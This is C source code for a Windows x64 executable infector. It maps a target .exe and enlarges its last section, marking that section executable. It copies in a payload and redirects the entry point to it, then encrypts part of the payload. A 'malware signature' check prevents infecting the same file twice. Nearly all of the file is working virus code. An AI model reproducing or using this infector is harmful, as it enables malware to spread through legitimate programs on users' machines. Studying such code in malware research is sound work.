#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "encrypt.hpp"
#include "libaes.h"
#include "payload.h"
#include "utils.h"

int main(int argc, char* argv[]) {
    printf("Payload: %p\n", &__payload_start);
    printf("Pl. enc: %p\n", &__payload_enc_start);
    printf("Pl. end: %p\n", &__payload_end);
    putchar('\n');

    int ret = 0;
    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwFileAlignment, dwSizeAligned, dwSectionAlignment, dwLastSectionPtr,
        dwLastSectionSize, dwLastSectionRva, dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint,
        dwOldProtect;
    ULARGE_INTEGER uliSize;
    // RO: read-only, RW: read-write
    PCIMAGE_DOS_HEADER pDosHeaderRO;
    PCIMAGE_NT_HEADERS64 pNtHeaderRO;
    PCIMAGE_SECTION_HEADER pSectionRO, pLastSectionRO;
    PIMAGE_DOS_HEADER pDosHeaderRW;
    PIMAGE_NT_HEADERS64 pNtHeaderRW;
    PIMAGE_SECTION_HEADER pSectionRW, pLastSectionRW;
    PBYTE pPayloadData;
    SSIZE_T sszPayloadEncOffset;
    WORD wNbSections;
#ifndef SKIP_SIGN
    DWORD dwSignature;
#endif  // SKIP_SIGN

    CONST DWORD dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
    printf("Payload size: %lu\n", dwPayloadSize);
    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target.exe>\n", argv[0]);
        ret = 1;
        goto exit;
    }

    printf("[*] Reading file: %s\n", argv[1]);

    hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("CreateFileA");
        ret = 1;
        goto exit;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    printf("File size: %lu bytes\n", dwFileSize);
    LIQUAD(uliSize) = dwFileSize;

    // First, map the file in read-only mode to check if it's a valid PE file, and get some
    // information about it (eg. alignment, to remap it in read-write mode later on)

    hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READONLY, LIHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMappingA");
        ret = 1;
        goto close_file;
    }

    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    pDosHeaderRO = (PCIMAGE_DOS_HEADER)pMapAddress;
    if (pDosHeaderRO->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature\n");
        ret = 1;
        goto unmap;
    }
    pNtHeaderRO = (PCIMAGE_NT_HEADERS64)((PBYTE)pDosHeaderRO + pDosHeaderRO->e_lfanew);
    if (pNtHeaderRO->Signature != IMAGE_NT_SIGNATURE ||
        pNtHeaderRO->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pNtHeaderRO->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[!] Not a PE x64 file\n");
        ret = 1;
        goto unmap;
    }

    dwFileAlignment = pNtHeaderRO->OptionalHeader.FileAlignment;
    dwSectionAlignment = pNtHeaderRO->OptionalHeader.SectionAlignment;
    printf("File alignment:    %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
    printf("Section alignment: %#lx (%lu)\n", dwSectionAlignment, dwSectionAlignment);

    wNbSections = pNtHeaderRO->FileHeader.NumberOfSections;
    pSectionRO = IMAGE_FIRST_SECTION(pNtHeaderRO);
    pLastSectionRO = &pSectionRO[wNbSections - 1];
    dwLastSectionPtr = pLastSectionRO->PointerToRawData;
    dwLastSectionSize = pLastSectionRO->SizeOfRawData;
    dwLastSectionRva = pLastSectionRO->VirtualAddress;
    dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
    dwOrigEntryPoint = pNtHeaderRO->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point:       %#010lx\n", dwOrigEntryPoint);
    printf("Nb. of sections:   %hu\n", wNbSections);
    printf("Last section name: %s\n", pLastSectionRO->Name);
    printf("Last section ptr:  %#010lx\n", dwLastSectionPtr);
    printf("Old raw size:      %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
    printf("Old virtsize:      %#lx (%lu)\n", pLastSectionRO->Misc.VirtualSize,
           pLastSectionRO->Misc.VirtualSize);
    printf("Old size of code:  %lu\n", pNtHeaderRO->OptionalHeader.SizeOfCode);
    printf("Old size of image: %lu\n", pNtHeaderRO->OptionalHeader.SizeOfImage);

#ifndef SKIP_SIGN
    // Check if the payload is already injected by looking for the signature
    // right before the entry point, if it's inside the last section
    if (dwOrigEntryPoint >= dwLastSectionRva &&
        dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
        dwSignature = *(PCDWORD)((PCBYTE)pDosHeaderRO + dwLastSectionPtr +
                                 (dwOrigEntryPoint - dwLastSectionRva) -
                                 ((PCBYTE)&payload - (PCBYTE)&signature));
        printf("\nEntry point seems suspicious (inside last section)\n");
        printf("Malware signature: %#010lx\n", dwSignature);
        if (dwSignature == signature) {
            printf("Payload already injected!\n");
            ret = 1;
            goto unmap;
        }
    }
#endif  // SKIP_SIGN

    // Unmap the file to remap it in read-write mode
    UnmapViewOfFile(pMapAddress);
    CloseHandle(hMapFile);

    // Make code_size and to_c_code writable to update their values
    VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
    code_size = dwPayloadSize;
    VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);

    VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
    to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
    VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);

    // Section raw data must be aligned to FileAlignment
    // Since the original section is assumed to be aligned, we just need to align the payload
    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);

    // Make sure the final file size is aligned
    LIQUAD(uliSize) = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);

    // Remap the file in read-write mode to inject the payload and update the headers
    hMapFile = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, LIHILO(uliSize), NULL);
    if (hMapFile == NULL) {
        PrintError("CreateFileMappingA");
        ret = 1;
        goto close_file;
    }

    pMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (pMapAddress == NULL) {
        PrintError("MapViewOfFile");
        ret = 1;
        goto close_map;
    }

    printf("[*] Injecting payload...\n");

    pDosHeaderRW = (PIMAGE_DOS_HEADER)pMapAddress;
    pNtHeaderRW = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeaderRW + pDosHeaderRW->e_lfanew);
    pSectionRW = IMAGE_FIRST_SECTION(pNtHeaderRW);
    pLastSectionRW = &pSectionRW[wNbSections - 1];

    pLastSectionRW->Misc.VirtualSize = pLastSectionRW->SizeOfRawData + dwPayloadSize;
    pLastSectionRW->SizeOfRawData += dwSizeAligned;
    // If the last section is already code, only add the (aligned) new payload size to SizeOfCode
    // Otherwise, add the whole section size since we're going to mark it as code anyway
    pNtHeaderRW->OptionalHeader.SizeOfCode += pLastSectionRW->Characteristics & IMAGE_SCN_CNT_CODE
                                                  ? dwSizeAligned
                                                  : pLastSectionRW->SizeOfRawData;
    // SizeOfImage must be aligned to SectionAlignment
    pNtHeaderRW->OptionalHeader.SizeOfImage =
        ALIGN(dwLastSectionRva + pLastSectionRW->Misc.VirtualSize, dwSectionAlignment);
    // Make the last section executable, and mark it as code and not discardable
    pLastSectionRW->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    pLastSectionRW->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
    printf("New raw size:      %#lx (%lu)\n", pLastSectionRW->SizeOfRawData,
           pLastSectionRW->SizeOfRawData);
    printf("New virtsize:      %#lx (%lu)\n", pLastSectionRW->Misc.VirtualSize,
           pLastSectionRW->Misc.VirtualSize);
    printf("New size of code:  %lu\n", pNtHeaderRW->OptionalHeader.SizeOfCode);
    printf("New size of image: %lu\n", pNtHeaderRW->OptionalHeader.SizeOfImage);

    dwNewEntryPoint =
        dwLastSectionRva + dwLastSectionSize + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
    pNtHeaderRW->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    printf("New entry point: %#010lx\n", dwNewEntryPoint);

    VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
    delta_start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
    VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
    printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);

    // Payload is ready to be injected
    printf("New payload:\n");
    HexDump(&__payload_start, dwPayloadSize);

    pPayloadData = (PBYTE)pDosHeaderRW + dwPayloadPtr;

    memcpy(pPayloadData, &__payload_start, dwPayloadSize);

    printf("[*] Injection complete!\n");

    printf("[*] Encrypting payload...\n");
    sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
    if (sszPayloadEncOffset < 0) {
        printf("[!] Encrypted payload starts before the main payload\n");
        ret = 1;
        goto unmap;
    }

    if (EncryptPayload(pPayloadData + sszPayloadEncOffset, dwPayloadSize - sszPayloadEncOffset)) {
        ret = 1;
        goto unmap;
    }

    printf("[*] Done!\n");

    HexDump(pPayloadData, dwPayloadSize);

    FlushViewOfFile(pMapAddress, 0);
unmap:
    UnmapViewOfFile(pMapAddress);
    FlushFileBuffers(hFile);
close_map:
    CloseHandle(hMapFile);
close_file:
    CloseHandle(hFile);
exit:
    return ret;
}
